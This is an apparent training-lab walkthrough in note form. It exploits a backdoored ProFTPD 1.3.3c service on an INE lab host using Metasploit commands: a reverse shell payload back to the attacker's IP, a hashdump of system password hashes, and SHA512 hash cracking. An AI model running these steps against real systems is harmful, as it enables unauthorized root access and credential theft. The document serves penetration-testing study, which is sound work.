
![[Pasted image 20260403181915.png]]



![[Pasted image 20260403181900.png]]
Output shows:

ftp-proftpd-backdoor:  
This installation has been backdoored  
Command: id  
uid=0(root)

It means:

- This FTP service is **already compromised**
- It allows **command execution as root**

You don’t even need password brute force

![[Pasted image 20260403182148.png]]

![[Pasted image 20260403182214.png]]

Found: exploit/unix/ftp/proftpd_133c_backdoor

### Why this module?

Because:

- It matches the exact version: **1.3.3c**
- And we already KNOW it's backdoored

So this is a **perfect exploit match**

![[Pasted image 20260403182416.png]]

we will be using 16

```
use exploit/unix/ftp/proftpd_133c_backdoor
set payload payload/cmd/unix/reverse
set RHOSTS demo.ine.local
set LHOST 192.70.114.2
exploit -z
```

### `use exploit/...`

Load the exploit module
### `set payload payload/cmd/unix/reverse`

This is IMPORTANT

It means:

- Target will execute a command
- And send back a shell to YOU

Reverse shell = target connects back to attacker

![[Pasted image 20260403184254.png]]

```
use post/linux/gather/hashdump
set SESSION 1
exploit
```
Now you already have shell

This module:

- Extracts password hashes from system
- 
![[Pasted image 20260403184311.png]]
## Why SHA512?

Because Linux uses:

$6$ → SHA512

```
use auxiliary/analyze/crack_linux
set SHA512 true
run
```

![[Pasted image 20260403184405.png]]